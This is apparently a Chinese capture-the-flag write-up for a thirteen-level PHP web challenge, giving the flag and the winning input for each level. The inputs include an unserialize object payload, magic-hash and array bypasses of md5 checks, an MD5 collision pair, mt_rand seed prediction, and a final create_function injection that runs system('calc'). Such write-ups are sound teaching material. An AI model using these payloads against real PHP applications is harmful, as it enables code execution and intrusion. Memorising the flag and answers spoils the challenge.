* 题目名称： 夺命十三枪

* 题目类型： WEB

* 题目难度： 困难

* 出题人： Chimedal

* 考点：php绕过大乱炖

* 描述：国服韩信在初赛失利后毅然闭关，刻苦钻研PHP，打磨出这一绝世武功——夺命十三枪。
夺命十三枪始于浩荡天恩
逐百鬼夜行天下无双
风无声 心如止水
光无影 七剑无衡
海纳百川浑然依啄
各位师傅能接几枪呢？

* flag： XSCTF{Yanz1_i_w1sh_y0u_hApp1neSs}

* Writeup：
第一关：
```
man1=hahah&man2=xiaohexiaohexiaohexiaohexiaohexiaohexiaohexiaohexiaohexiaohexiaohexiaohexiaohexiaohexiaohexiaohexiaohexiaohe";s:4:"ohoh";b:1;}
```

第二关：
```
&username=hanxin&code=t0
```

第三关：
```
d=99999
```

第四关：
```
num[1]=a&num[2]=b
```

第五关：
```
mdmd1=QNKCDZO&mdmd2=s878926199a
```

第六关：
```
mdmdmd1[]=1&mdmdmd2[]=2
```

第七关：
```
mdmdmdmd1=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&mdmdmdmd2=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
```

第八关
```
qq=xx[0]=s878926199a
```

第九关
```
pra=2306312
```

第十关
这里考察了种子爆破，使用`php_mt_seed`工具进行爆破。
根据代码，会在一定时间内给出我们第一个随机数，然后我们根据这个随机数去爆破。
```php
<?php
mt_srand(1728453);
echo "hint:" . (mt_rand()) . "<br />";
for ($i = 0; $i <= 100; $i++) {

    if ($i == 100) {
        $sui = mt_rand();
        print_r($sui);
    } else {
        mt_rand();
    }
}
```
这里写了一个循环，我们可以利用题目中的代码去生成对应的随机数，然后去给POST中的many赋值。

第十一关
```
?a=QNKCDZO&b=240610708&c=/+ 
```

第十二关
```
这里用到十六进制0x117c或者八进制010574
```

第十三关
```
flag1=\create_function&flag2=return;}system("calc");//
```








